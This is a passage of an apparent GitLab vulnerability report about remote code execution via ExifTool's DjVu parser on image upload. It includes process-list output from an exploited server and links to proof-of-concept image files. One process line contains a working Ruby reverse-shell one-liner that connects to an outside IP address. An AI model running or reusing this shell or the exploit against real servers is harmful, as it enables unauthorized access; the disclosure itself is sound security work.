--collector.netstat.fields=^(.*_(InErrors|InErrs)|Ip_Forwarding|Ip(6|Ext)_(InOctets|OutOctets)|Icmp6?_(InMsgs|OutMsgs)|TcpExt_(Listen.*|Syncookies.*|TCPSynRetrans)|Tcp_(ActiveOpens|InSegs|OutSegs|OutRsts|PassiveOpens|RetransSegs|CurrEstab)|Udp6?_(InDatagrams|OutDatagrams|NoPorts|RcvbufErrors|SndbufErrors))$  </span>&#x000A;<span id="LC143" class="line" lang="plaintext">root      1224  0.0  0.0      0     0 ?        I&lt;    2020   1:36 [kworker/10:1H]  </span>&#x000A;<span id="LC144" class="line" lang="plaintext">root      1230  0.0  0.0  16124  2920 ?        Ss    2020   0:01 /sbin/dhclient -1 -v -pf /run/dhclient.ens4.pid -lf /var/lib/dhcp/dhclient.ens4.leases -I -df /var/lib/dhcp/dhclient6.ens4.leases ens4  </span>&#x000A;<span id="LC145" class="line" lang="plaintext">root      1386  0.0  0.0   5220   112 ?        Ss    2020   6:09 /sbin/iscsid  </span>&#x000A;<span id="LC146" class="line" lang="plaintext">root      1389  0.0  0.0   5720  3512 ?        S&lt;Ls  2020  29:44 /sbin/iscsid  </span>&#x000A;<span id="LC147" class="line" lang="plaintext">root      1407  0.0  0.0 382660   408 ?        Ssl   2020   3:07 /usr/bin/lxcfs /var/lib/lxcfs/  </span>&#x000A;<span id="LC148" class="line" lang="plaintext">root      1426  0.0  0.0  27728  2320 ?        Ss    2020   3:41 /usr/sbin/cron -f  </span>&#x000A;<span id="LC149" class="line" lang="plaintext">syslog    1446  0.0  0.0 256392  2112 ?        Ssl   2020  56:37 /usr/sbin/rsyslogd -n  </span>&#x000A;<span id="LC150" class="line" lang="plaintext">root      1476  0.0  0.0  28628  2648 ?        Ss    2020   0:51 /lib/systemd/systemd-logind  </span>&#x000A;<span id="LC151" class="line" lang="plaintext">root      1512  0.0  0.0   4396  1208 ?        Ss    2020   0:00 /usr/sbin/acpid  </span>&#x000A;<span id="LC152" class="line" lang="plaintext">daemon    1525  0.0  0.0  26044  1464 ?        Ss    2020   0:00 /usr/sbin/atd -f  </span>&#x000A;<span id="LC153" class="line" lang="plaintext">postfix   1570  0.0  0.0  67476  4488 ?        S    12:40   0:00 pickup -l -t fifo -u  </span>&#x000A;<span id="LC154" class="line" lang="plaintext">root      1593  0.0  0.0   4392   904 ?        Ss    2020   7:41 runsvdir -P /etc/service log: /process HTTP/1.1" 200 153 - -&gt; /process 10.219.1.10 - - [07/Apr/2021:13:13:54 UTC] "GET /process HTTP/1.1" 200 153 - -&gt; /process 10.219.1.9 - - [07/Apr/2021:13:13:58 UTC] "GET /process HTTP/1.1" 200 153 - -&gt; /process 10.219.1.10 - - [07/Apr/2021:13:14:09 UTC] "GET /process HTTP/1.1" 200 153 - -&gt; /process 10.219.1.9 - - [07/Apr/2021:13:14:13 UTC] "GET /process HTTP/1.1" 200 153 - -&gt; /process  </span>&#x000A;<span id="LC155" class="line" lang="plaintext">git       1594 50.1  2.0 2843912 1351680 ?     Sl   12:40  17:00 puma: cluster worker 0: 7369 [gitlab-puma-worker]  </span>&#x000A;<span id="LC156" class="line" lang="plaintext">message+  1599  0.0  0.0  43028  3356 ?        Ss    2020   1:36 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation  </span>&#x000A;<span id="LC157" class="line" lang="plaintext">root      1615  0.0  0.0   4240  1200 ?        Ss    2020   0:26 runsv apt_metrics  </span>&#x000A;<span id="LC158" class="line" lang="plaintext">root      1617  0.0  0.0   4240  1104 ?        Ss    2020   0:03 runsv node_exporter  </span>&#x000A;<span id="LC159" class="line" lang="plaintext">root      1618  0.0  0.0   4240  1104 ?        Ss    2020   4:24 runsv ntpd_metrics  </span>&#x000A;<span id="LC160" class="line" lang="plaintext">root      1620  0.0  0.0   4240   380 ?        Ss    2020   0:00 runsv gitlab-monitor  </span>&#x000A;<span id="LC161" class="line" lang="plaintext">root      1621  0.0  0.0   4240   388 ?        Ss    2020   0:00 runsv mtail  </span>&#x000A;<span id="LC162" class="line" lang="plaintext">root      1623  0.0  0.0      0     0 ?        I&lt;    2020  15:18 [kworker/0:1H]  </span>&#x000A;<span id="LC163" class="line" lang="plaintext">root      1624  0.0  0.0   4384   252 ?        S     2020   0:04 svlogd -tt /var/log/mtail  </span>&#x000A;<span id="LC164" class="line" lang="plaintext">root      1625  0.0  0.0   4384   380 ?        S     2020   0:00 svlogd -tt /var/log/prometheus/node_exporter_apt_metrics  </span>&#x000A;<span id="LC165" class="line" lang="plaintext">root      1626  0.0  0.0   4384   224 ?        S     2020   0:00 svlogd -tt /var/log/prometheus/node_exporter_ntpd_metrics  </span>&#x000A;<span id="LC166" class="line" lang="plaintext">root      1627  0.0  0.0   4384   236 ?        S     2020   0:02 svlogd -tt /var/log/prometheus/node_exporter  </span>&#x000A;<span id="LC167" class="line" lang="plaintext">root      1628  0.0  0.0   4384   240 ?        S     2020   0:00 svlogd -tt /var/log/gitlab-monitor  </span>&#x000A;<span id="LC168" class="line" lang="plaintext">root      1713  0.0  0.0  13372   908 ?        Ss    2020   0:02 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog  </span>&#x000A;<span id="LC169" class="line" lang="plaintext">root      1716  0.0  0.0      0     0 ?        I&lt;    2020   0:46 [kworker/14:1H]  </span>&#x000A;<span id="LC170" class="line" lang="plaintext">root      1844  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [nfsiod]  </span>&#x000A;<span id="LC171" class="line" lang="plaintext">root      1850  0.0  0.0 277088  2224 ?        Ssl   2020   0:36 /usr/lib/policykit-1/polkitd --no-debug  </span>&#x000A;<span id="LC172" class="line" lang="plaintext">root      1878  0.0  0.0      0     0 ?        I&lt;    2020   5:54 [kworker/2:1H]  </span>&#x000A;<span id="LC173" class="line" lang="plaintext">root      2084  0.0  0.0      0     0 ?        I    Apr06   0:00 [kworker/6:0]  </span>&#x000A;<span id="LC174" class="line" lang="plaintext">root      2095  0.0  0.0  65512  3084 ?        Ss    2020   0:04 /usr/sbin/sshd -D  </span>&#x000A;<span id="LC175" class="line" lang="plaintext">root      2102  0.0  0.0      0     0 ?        I&lt;    2020   2:31 [kworker/9:1H]  </span>&#x000A;<span id="LC176" class="line" lang="plaintext">root      2120  0.0  0.0      0     0 ?        I&lt;    2020   5:08 [kworker/3:1H]  </span>&#x000A;<span id="LC177" class="line" lang="plaintext">root      2138  0.0  0.0      0     0 ?        I&lt;    2020   0:31 [kworker/15:1H]  </span>&#x000A;<span id="LC178" class="line" lang="plaintext">root      2146  0.0  0.0      0     0 ?        I&lt;    2020  23:45 [kworker/1:1H]  </span>&#x000A;<span id="LC179" class="line" lang="plaintext">root      2151  0.0  0.0      0     0 ?        I&lt;    2020   0:40 [kworker/4:1H]  </span>&#x000A;<span id="LC180" class="line" lang="plaintext">root      2167  0.0  0.0  14656  1372 tty1     Ss+   2020   0:00 /sbin/agetty --noclear tty1 linux  </span>&#x000A;<span id="LC181" class="line" lang="plaintext">root      2177  0.0  0.0  14472  1556 ttyS0    Ss+   2020   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220  </span>&#x000A;<span id="LC182" class="line" lang="plaintext">ntp       2204  0.0  0.0  40268  2576 ?        Ss    2020  21:06 /usr/sbin/ntpd -p /var/run/ntpd.pid -g -c /var/lib/ntp/ntp.conf.dhcp -u 112:116  </span>&#x000A;<span id="LC183" class="line" lang="plaintext">root      2270  0.0  0.0  67480 18788 ?        Ss    2020  17:03 /usr/bin/python3 /usr/bin/google_ip_forwarding_daemon  </span>&#x000A;<span id="LC184" class="line" lang="plaintext">root      2272  0.0  0.0  67220 16368 ?        Ss    2020  10:50 /usr/bin/python3 /usr/bin/google_clock_skew_daemon  </span>&#x000A;<span id="LC185" class="line" lang="plaintext">root      2402  0.0  0.0  65408  2460 ?        Ss    2020   1:05 /usr/lib/postfix/sbin/master  </span>&#x000A;<span id="LC186" class="line" lang="plaintext">postfix   2411  0.0  0.0  67640  1988 ?        S     2020   0:23 qmgr -l -t fifo -u  </span>&#x000A;<span id="LC187" class="line" lang="plaintext">root      2571  0.0  0.0   4392   848 ?        Ss    2020   2:50 runsvdir -P /opt/gitlab/service log: ...........................................................................................................................................................................................................................................................................................................................................................................................................  </span>&#x000A;<span id="LC188" class="line" lang="plaintext">root      2618  0.0  0.0   4240  1104 ?        Ss    2020   0:01 runsv puma  </span>&#x000A;<span id="LC189" class="line" lang="plaintext">root      2621  0.0  0.0   4240  1192 ?        Ss    2020   0:05 runsv logrotate  </span>&#x000A;<span id="LC190" class="line" lang="plaintext">root      2623  0.0  0.0   4240  1144 ?        Ss    2020   0:00 runsv nginx  </span>&#x000A;<span id="LC191" class="line" lang="plaintext">root      2625  0.0  0.0   4240  1092 ?        Ss    2020   0:01 runsv gitlab-workhorse  </span>&#x000A;<span id="LC192" class="line" lang="plaintext">gitlab-+  3150  0.0  0.0 754368 26924 ?        Sl   Feb17  35:28 /opt/ruby-2.7.0/bin/ruby /opt/gitlab-monitor/bin/gitlab-mon web -c /opt/gitlab-monitor/config/worker-config.yml  </span>&#x000A;<span id="LC193" class="line" lang="plaintext">root      3164  0.0  0.0      0     0 ?        I&lt;    2020   0:12 [kworker/11:1H]  </span>&#x000A;<span id="LC194" class="line" lang="plaintext">root      3211  0.2  0.0      0     0 ?        I    12:42   0:04 [kworker/u32:2]  </span>&#x000A;<span id="LC195" class="line" lang="plaintext">root      3222  0.0  0.0      0     0 ?        I&lt;    2020   0:15 [kworker/7:1H]  </span>&#x000A;<span id="LC196" class="line" lang="plaintext">root      3463  0.0  0.0      0     0 ?        I    10:35   0:00 [kworker/5:1]  </span>&#x000A;<span id="LC197" class="line" lang="plaintext">root      3511  0.0  0.0      0     0 ?        I    11:40   0:00 [kworker/12:0]  </span>&#x000A;<span id="LC198" class="line" lang="plaintext">root      4032  0.0  0.1 1571276 107596 ?      Ssl   2020 172:34 /opt/prometheus/ebpf_exporter/ebpf_exporter --web.listen-address=:9435 --config.file=/opt/prometheus/ebpf_exporter/config.yml  </span>&#x000A;<span id="LC199" class="line" lang="plaintext">root      4171  0.0  0.0   4376   640 ?        S    13:12   0:00 sleep 600  </span>&#x000A;<span id="LC200" class="line" lang="plaintext">root      4302  0.0  0.0      0     0 ?        I&lt;    2020   2:25 [kworker/5:1H]  </span>&#x000A;<span id="LC201" class="line" lang="plaintext">root      4391  0.0  0.0      0     0 ?        I&lt;    2020   0:14 [kworker/8:1H]  </span>&#x000A;<span id="LC202" class="line" lang="plaintext">root      4699  0.0  0.0      0     0 ?        I    11:09   0:00 [kworker/13:2]  </span>&#x000A;<span id="LC203" class="line" lang="plaintext">root      4812  0.0  0.0   4376   672 ?        S    13:13   0:00 sleep 60  </span>&#x000A;<span id="LC204" class="line" lang="plaintext">root      5375  0.0  0.0   4504   788 ?        Ss   13:13   0:00 /bin/sh /opt/gitlab/embedded/bin/gitlab-logrotate-wrapper  </span>&#x000A;<span id="LC205" class="line" lang="plaintext">root      5379  0.0  0.0   4376   748 ?        S    13:13   0:00 sleep 600  </span>&#x000A;<span id="LC206" class="line" lang="plaintext">git       5398 49.7  1.9 2661404 1274712 ?     Sl   12:44  14:43 puma: cluster worker 3: 7369 [gitlab-puma-worker]  </span>&#x000A;<span id="LC207" class="line" lang="plaintext">git       5544  1.3  0.0  45604 27664 ?        S    13:14   0:00 /usr/bin/perl -w /opt/gitlab/embedded/bin/exiftool -all= --IPTC:all --XMP-iptcExt:all -tagsFromFile @ -ResolutionUnit -XResolution -YResolution -YCbCrSubSampling -YCbCrPositioning -BitsPerSample -ImageHeight -ImageWidth -ImageSize -Copyright -CopyrightNotice -Orientation -  </span>&#x000A;<span id="LC208" class="line" lang="plaintext">git       5545  0.0  0.0      0     0 ?        Z    13:14   0:00 [sh] &lt;defunct&gt;  </span>&#x000A;<span id="LC209" class="line" lang="plaintext">git       5551  0.0  0.0 105260 10840 ?        S    13:14   0:00 ruby -rsocket -e exit if fork;c=TCPSocket.new("103.3.61.137",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end  </span>&#x000A;<span id="LC210" class="line" lang="plaintext">git       5667  0.0  0.0   4504   740 ?        S    13:14   0:00 sh -c ps auxww  </span>&#x000A;<span id="LC211" class="line" lang="plaintext">git       5668  0.0  0.0  34424  2864 ?        R    13:14   0:00 ps auxww  </span>&#x000A;<span id="LC212" class="line" lang="plaintext">root      5952  0.0  0.0      0     0 ?        I    00:24   0:00 [kworker/5:2]  </span>&#x000A;<span id="LC213" class="line" lang="plaintext">root      6812  0.0  0.0  54640  7080 ?        Ss   Mar08   0:00 nginx: master process /opt/gitlab/embedded/sbin/nginx -p /var/opt/gitlab/nginx  </span>&#x000A;<span id="LC214" class="line" lang="plaintext">gitlab-+  6813  0.0  0.0  59476 12544 ?        S    Mar08  18:42 nginx: worker process  </span>&#x000A;<span id="LC215" class="line" lang="plaintext">gitlab-+  6814  0.0  0.0  59380 13704 ?        S    Mar08  18:28 nginx: worker process  </span>&#x000A;<span id="LC216" class="line" lang="plaintext">gitlab-+  6815  0.0  0.0  59504 13088 ?        S    Mar08  18:57 nginx: worker process  </span>&#x000A;<span id="LC217" class="line" lang="plaintext">gitlab-+  6816  0.0  0.0  59456 13048 ?        S    Mar08  19:35 nginx: worker process  </span>&#x000A;<span id="LC218" class="line" lang="plaintext">gitlab-+  6817  0.0  0.0  59468 13396 ?        S    Mar08  18:41 nginx: worker process  </span>&#x000A;<span id="LC219" class="line" lang="plaintext">gitlab-+  6818  0.0  0.0  59508 13700 ?        S    Mar08  20:20 nginx: worker process  </span>&#x000A;<span id="LC220" class="line" lang="plaintext">gitlab-+  6819  0.0  0.0  59492 13220 ?        S    Mar08  19:33 nginx: worker process  </span>&#x000A;<span id="LC221" class="line" lang="plaintext">gitlab-+  6820  0.0  0.0  59460 13420 ?        S    Mar08  22:00 nginx: worker process  </span>&#x000A;<span id="LC222" class="line" lang="plaintext">gitlab-+  6821  0.0  0.0  59508 13420 ?        S    Mar08  24:15 nginx: worker process  </span>&#x000A;<span id="LC223" class="line" lang="plaintext">gitlab-+  6822  0.0  0.0  59500 13348 ?        S    Mar08  20:53 nginx: worker process  </span>&#x000A;<span id="LC224" class="line" lang="plaintext">gitlab-+  6823  0.0  0.0  59660 13588 ?        S    Mar08  27:47 nginx: worker process  </span>&#x000A;<span id="LC225" class="line" lang="plaintext">gitlab-+  6824  0.0  0.0  59972 14116 ?        S    Mar08  37:52 nginx: worker process  </span>&#x000A;<span id="LC226" class="line" lang="plaintext">gitlab-+  6825  4.0  0.0  63940 18592 ?        S    Mar08 1788:21 nginx: worker process  </span>&#x000A;<span id="LC227" class="line" lang="plaintext">gitlab-+  6826  1.9  0.0  61436 15808 ?        S    Mar08 854:41 nginx: worker process  </span>&#x000A;<span id="LC228" class="line" lang="plaintext">gitlab-+  6827  0.1  0.0  60120 14564 ?        S    Mar08  79:52 nginx: worker process  </span>&#x000A;<span id="LC229" class="line" lang="plaintext">gitlab-+  6828  0.8  0.0  62348 16532 ?        S    Mar08 351:59 nginx: worker process  </span>&#x000A;<span id="LC230" class="line" lang="plaintext">gitlab-+  6829  0.0  0.0  54836  3732 ?        S    Mar08   0:08 nginx: cache manager process  </span>&#x000A;<span id="LC231" class="line" lang="plaintext">git       6952 17.6  0.1 1532460 109784 ?      Ssl  10:04  33:35 /opt/gitlab/embedded/bin/gitlab-workhorse -listenNetwork unix -listenUmask 0 -listenAddr /var/opt/gitlab/gitlab-workhorse/sockets/socket -authBackend http://localhost:8080 -authSocket /var/opt/gitlab/gitlab-rails/sockets/gitlab.socket -documentRoot /opt/gitlab/embedded/service/gitlab-rails/public -pprofListenAddr  -apiLimit 5 -apiQueueDuration 60s -apiQueueLimit 200 -prometheusListenAddr 0.0.0.0:9229 -secretPath /opt/gitlab/embedded/service/gitlab-rails/.gitlab_workhorse_secret -logFormat json -config config.toml  </span>&#x000A;<span id="LC232" class="line" lang="plaintext">git       7369 10.3  1.5 1859556 1033020 ?     Ssl  10:04  19:41 puma 5.1.1 (unix:///var/opt/gitlab/gitlab-rails/sockets/gitlab.socket,tcp://0.0.0.0:8080) [gitlab-puma-worker]  </span>&#x000A;<span id="LC233" class="line" lang="plaintext">root      7522  0.0  0.0      0     0 ?        I    10:04   0:00 [kworker/11:2]  </span>&#x000A;<span id="LC234" class="line" lang="plaintext">root      8263  0.0  0.0      0     0 ?        I    12:15   0:00 [kworker/14:0]  </span>&#x000A;<span id="LC235" class="line" lang="plaintext">root      8266  0.0  0.0      0     0 ?        I    08:19   0:00 [kworker/0:2]  </span>&#x000A;<span id="LC236" class="line" lang="plaintext">root      8581  0.1  0.0      0     0 ?        I    12:48   0:02 [kworker/u32:1]  </span>&#x000A;<span id="LC237" class="line" lang="plaintext">root      9122  0.0  0.0      0     0 ?        I    10:37   0:00 [kworker/8:0]  </span>&#x000A;<span id="LC238" class="line" lang="plaintext">git       9978 47.0  2.0 3182348 1362056 ?     Sl   11:43  42:45 puma: cluster worker 8: 7369 [gitlab-puma-worker]  </span>&#x000A;<span id="LC239" class="line" lang="plaintext">consul   10871  0.5  0.2 257480 143704 ?       Ssl   2020 2836:38 /opt/consul/1.7.2/consul agent -config-file=/etc/consul/consul.json -config-dir=/etc/consul/conf.d  </span>&#x000A;<span id="LC240" class="line" lang="plaintext">git      10980 51.1  1.8 2507012 1229264 ?     Sl   12:49  12:43 puma: cluster worker 2: 7369 [gitlab-puma-worker]  </span>&#x000A;<span id="LC241" class="line" lang="plaintext">influxd+ 12182  0.0  0.0 188928  1044 ?        Ssl   2020   0:14 /usr/bin/influxdb-relay -config /etc/influxdb-relay/influxdb-relay.conf  </span>&#x000A;<span id="LC242" class="line" lang="plaintext">root     12322  0.0  0.0      0     0 ?        I    12:49   0:00 [kworker/11:1]  </span>&#x000A;<span id="LC243" class="line" lang="plaintext">root     12828  0.0  0.0   4384  1276 ?        S     2020   0:01 svlogd -tt /var/log/gitlab/puma  </span>&#x000A;<span id="LC244" class="line" lang="plaintext">root     12831  0.2  0.0   4384  1228 ?        S     2020 1318:06 svlogd /var/log/gitlab/gitlab-workhorse  </span>&#x000A;<span id="LC245" class="line" lang="plaintext">root     12853  0.0  0.0   4384  1260 ?        S     2020   0:02 svlogd -tt /var/log/gitlab/nginx  </span>&#x000A;<span id="LC246" class="line" lang="plaintext">root     12856  0.0  0.0   4384   340 ?        S     2020   0:00 svlogd -tt /var/log/gitlab/logrotate  </span>&#x000A;<span id="LC247" class="line" lang="plaintext">git      13196 48.0  2.1 2935068 1437312 ?     Sl   12:17  27:28 puma: cluster worker 10: 7369 [gitlab-puma-worker]  </span>&#x000A;<span id="LC248" class="line" lang="plaintext">root     13379  0.0  0.0      0     0 ?        I    09:53   0:00 [kworker/7:1]  </span>&#x000A;<span id="LC249" class="line" lang="plaintext">root     13382  0.0  0.0      0     0 ?        I    09:53   0:00 [kworker/10:1]  </span>&#x000A;<span id="LC250" class="line" lang="plaintext">root     13611  1.0  0.0 1740892 38864 ?       Ssl  Jan29 1042:19 /usr/bin/process-exporter --config.path /etc/process-exporter/chef-configured.yaml --web.listen-address=:9256 -threads=false -gather-smaps=false  </span>&#x000A;<span id="LC251" class="line" lang="plaintext">root     14478  0.0  0.0      0     0 ?        I    09:24   0:00 [kworker/2:0]  </span>&#x000A;<span id="LC252" class="line" lang="plaintext">git      17155 50.3  1.8 2541576 1218444 ?     Sl   12:50  11:50 puma: cluster worker 15: 7369 [gitlab-puma-worker]  </span>&#x000A;<span id="LC253" class="line" lang="plaintext">root     17904  0.0  0.0      0     0 ?        I    09:59   0:00 [kworker/2:2]  </span>&#x000A;<span id="LC254" class="line" lang="plaintext">git      21109 48.3  1.9 2572804 1258580 ?     Sl   12:55   9:17 puma: cluster worker 5: 7369 [gitlab-puma-worker]  </span>&#x000A;<span id="LC255" class="line" lang="plaintext">root     21296  0.0  0.0      0     0 ?        I    10:52   0:00 [kworker/8:1]  </span>&#x000A;<span id="LC256" class="line" lang="plaintext">root     21299  0.0  0.0      0     0 ?        I    10:52   0:00 [kworker/1:0]  </span>&#x000A;<span id="LC257" class="line" lang="plaintext">root     21301  0.0  0.0      0     0 ?        I    10:52   0:00 [kworker/7:0]  </span>&#x000A;<span id="LC258" class="line" lang="plaintext">root     21306  0.0  0.0      0     0 ?        I    10:52   0:00 [kworker/15:1]  </span>&#x000A;<span id="LC259" class="line" lang="plaintext">root     21376  0.0  0.0      0     0 ?        I    09:59   0:00 [kworker/9:0]  </span>&#x000A;<span id="LC260" class="line" lang="plaintext">git      21698 48.0  2.2 3093788 1459416 ?     Sl   12:26  23:00 puma: cluster worker 9: 7369 [gitlab-puma-worker]  </span>&#x000A;<span id="LC261" class="line" lang="plaintext">root     22003  0.2  0.0      0     0 ?        I    12:26   0:05 [kworker/u32:3]  </span>&#x000A;<span id="LC262" class="line" lang="plaintext">root     22131  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/9:2]  </span>&#x000A;<span id="LC263" class="line" lang="plaintext">root     22135  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/4:2]  </span>&#x000A;<span id="LC264" class="line" lang="plaintext">root     22142  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/12:3]  </span>&#x000A;<span id="LC265" class="line" lang="plaintext">root     22143  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/3:1]  </span>&#x000A;<span id="LC266" class="line" lang="plaintext">root     22144  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/13:0]  </span>&#x000A;<span id="LC267" class="line" lang="plaintext">root     22863  0.0  0.0 161112 54712 ?        Ssl  Jan18   0:15 /opt/chef/embedded/bin/ruby --disable-gems /usr/bin/chef-client -c /etc/chef/client.rb -i 1800 -s 300  </span>&#x000A;<span id="LC268" class="line" lang="plaintext">root     24237  0.0  0.0 288904 59208 ?        Sl   Mar10   6:50 /opt/td-agent/bin/ruby /opt/td-agent/bin/fluentd --log /var/log/td-agent/td-agent.log --daemon /var/run/td-agent/td-agent.pid  </span>&#x000A;<span id="LC269" class="line" lang="plaintext">root     24242 20.6  0.5 3044156 391860 ?      Sl   Mar10 8337:18 /opt/td-agent/bin/ruby -Eascii-8bit:ascii-8bit /opt/td-agent/bin/fluentd --log /var/log/td-agent/td-agent.log --daemon /var/run/td-agent/td-agent.pid --under-supervisor  </span>&#x000A;<span id="LC270" class="line" lang="plaintext">git      24253 51.3  2.0 2857244 1349560 ?     Sl   12:29  23:03 puma: cluster worker 13: 7369 [gitlab-puma-worker]  </span>&#x000A;<span id="LC271" class="line" lang="plaintext">root     24667  0.1  0.0      0     0 ?        I    11:29   0:11 [kworker/u32:4]  </span>&#x000A;<span id="LC272" class="line" lang="plaintext">root     24911  0.0  0.0      0     0 ?        I    Apr06   0:00 [kworker/6:2]  </span>&#x000A;<span id="LC273" class="line" lang="plaintext">root     25156  0.2  0.0      0     0 ?        I    12:59   0:01 [kworker/u32:5]  </span>&#x000A;<span id="LC274" class="line" lang="plaintext">root     25516  0.0  0.0      0     0 ?        I    07:36   0:00 [kworker/1:1]  </span>&#x000A;<span id="LC275" class="line" lang="plaintext">git      25517 50.4  2.1 2870560 1443204 ?     Sl   12:30  21:58 puma: cluster worker 6: 7369 [gitlab-puma-worker]  </span>&#x000A;<span id="LC276" class="line" lang="plaintext">git      25521 49.9  1.8 2550792 1218900 ?     Sl   13:00   7:06 puma: cluster worker 4: 7369 [gitlab-puma-worker]  </span>&#x000A;<span id="LC277" class="line" lang="plaintext">root     25525  0.0  0.0      0     0 ?        I    07:36   0:00 [kworker/3:2]  </span>&#x000A;<span id="LC278" class="line" lang="plaintext">root     25527  0.0  0.0      0     0 ?        I    07:36   0:00 [kworker/15:2]  </span>&#x000A;<span id="LC279" class="line" lang="plaintext">root     26983  0.0  0.0      0     0 ?        I    Apr06   0:00 [kworker/10:2]  </span>&#x000A;<span id="LC280" class="line" lang="plaintext">root     27893  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [xfsalloc]  </span>&#x000A;<span id="LC281" class="line" lang="plaintext">root     27894  0.0  0.0      0     0 ?        I&lt;    2020   0:00 [xfs_mru_cache]  </span>&#x000A;<span id="LC282" class="line" lang="plaintext">git      28051 49.9  1.8 2635012 1248076 ?     Sl   13:03   5:34 puma: cluster worker 11: 7369 [gitlab-puma-worker]  </span>&#x000A;<span id="LC283" class="line" lang="plaintext">git      28140 50.3  2.1 2943756 1397844 ?     Sl   12:33  20:26 puma: cluster worker 14: 7369 [gitlab-puma-worker]  </span>&#x000A;<span id="LC284" class="line" lang="plaintext">git      29132 49.0  2.0 3164444 1367952 ?     Sl   12:05  33:39 puma: cluster worker 1: 7369 [gitlab-puma-worker]  </span>&#x000A;<span id="LC285" class="line" lang="plaintext">root     30224  0.0  0.0      0     0 ?        I    06:02   0:00 [kworker/14:1]  </span>&#x000A;<span id="LC286" class="line" lang="plaintext">root     30233  0.0  0.0      0     0 ?        I    06:02   0:00 [kworker/0:1]  </span>&#x000A;<span id="LC287" class="line" lang="plaintext">root     31940  0.0  0.0 278944 10648 ?        Ssl   2020   6:14 /usr/lib/accountsservice/accounts-daemon  </span>&#x000A;<span id="LC288" class="line" lang="plaintext">root     32135  0.1  0.0      0     0 ?        I    13:07   0:00 [kworker/u32:0]  </span>&#x000A;<span id="LC289" class="line" lang="plaintext">root     32388  0.0  0.0      0     0 ?        I    01:32   0:00 [kworker/4:0]  </span>&#x000A;<span id="LC290" class="line" lang="plaintext">root     32453  5.3  0.0 1774984 40780 ?       Sl    2020 13156:17 /opt/prometheus/mtail/mtail -progs /opt/prometheus/mtail/progs -logs /var/log/apt/term.log,/var/log/syslog,/var/log/td-agent/td-agent.log,/var/log/gitlab/gitlab-rails/*.log,/var/log/gitlab/unicorn/unicorn_stderr.log,/var/log/gitlab/unicorn/unicorn_stdout.log -logtostderr  </span>&#x000A;<span id="LC291" class="line" lang="plaintext">git      32635 49.4  2.1 3154204 1401116 ?     Sl   12:09  31:54 puma: cluster worker 12: 7369 [gitlab-puma-worker]  </span>&#x000A;<span id="LC292" class="line" lang="plaintext">git      32703 48.7  1.8 2402308 1195496 ?     Sl   13:08   3:01 puma: cluster worker 7: 7369 [gitlab-puma-worker]  </span>&#x000A;<span id="LC293" class="line" lang="plaintext">exit  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<h5 data-sourcepos="332:1-332:15" dir="auto">&#x000A;<a id="user-content-impact" class="anchor" href="#impact" aria-hidden="true"></a>Impact</h5>&#x000A;<ul data-sourcepos="333:1-334:0" dir="auto">&#x000A;<li data-sourcepos="333:1-334:0">Anyone with the ability to upload an image that goes through the GitLab Workhorse could achieve RCE via a specially crafted file</li>&#x000A;</ul>&#x000A;<h5 data-sourcepos="335:1-335:17" dir="auto">&#x000A;<a id="user-content-examples" class="anchor" href="#examples" aria-hidden="true"></a>Examples</h5>&#x000A;<p data-sourcepos="336:1-337:112" dir="auto"><a class="no-attachment-icon" href="https://user-content.gitlab-static.net/f4983715beaa9e82a87dab3b009c11a1eb181511/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64646163373265392d353161332d346430322d396435332d3137303966353032636637312f6563686f5f76616b7a7a2e6a70672e7a6970" target="_blank" rel="nofollow noreferrer noopener" data-canonical-src="https://h1.sec.gitlab.net/a/ddac72e9-51a3-4d02-9d53-1709f502cf71/echo_vakzz.jpg.zip"><img data-sourcepos="336:1-336:106" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="echo_vakzz.jpg.zip" data-canonical-src="https://h1.sec.gitlab.net/a/ddac72e9-51a3-4d02-9d53-1709f502cf71/echo_vakzz.jpg.zip" decoding="async" class="lazy" data-src="https://user-content.gitlab-static.net/f4983715beaa9e82a87dab3b009c11a1eb181511/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64646163373265392d353161332d346430322d396435332d3137303966353032636637312f6563686f5f76616b7a7a2e6a70672e7a6970"></a><br data-sourcepos="336:109-336:109">&#x000A;<a class="no-attachment-icon" href="https://user-content.gitlab-static.net/aa6b0ce079a3d047fd65797e65533920122451cf/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61353237346262372d646633392d343939612d396337612d6538343039313434636631362f726576657273655f7368656c6c2e6a70672e7a6970" target="_blank" rel="nofollow noreferrer noopener" data-canonical-src="https://h1.sec.gitlab.net/a/a5274bb7-df39-499a-9c7a-e8409144cf16/reverse_shell.jpg.zip"><img data-sourcepos="337:1-337:112" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="reverse_shell.jpg.zip" data-canonical-src="https://h1.sec.gitlab.net/a/a5274bb7-df39-499a-9c7a-e8409144cf16/reverse_shell.jpg.zip" decoding="async" class="lazy" data-src="https://user-content.gitlab-static.net/aa6b0ce079a3d047fd65797e65533920122451cf/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61353237346262372d646633392d343939612d396337612d6538343039313434636631362f726576657273655f7368656c6c2e6a70672e7a6970"></a></p>&#x000A;<h5 data-sourcepos="339:1-339:44" dir="auto">&#x000A;<a id="user-content-what-is-the-current-bug-behavior" class="anchor" href="#what-is-the-current-bug-behavior" aria-hidden="true"></a>What is the current <em data-sourcepos="339:28-339:32">bug</em> behavior?</h5>&#x000A;<p data-sourcepos="340:1-340:177" dir="auto">GitLab Workhorse will pass any file to ExifTool, greatly increasing the attack surface. The current bug is in the DjVu module of <code data-sourcepos="340:131-340:138">ExifTool</code> which should ideally not ever be hit.</p>&#x000A;<h5 data-sourcepos="342:1-342:49" dir="auto">&#x000A;<a 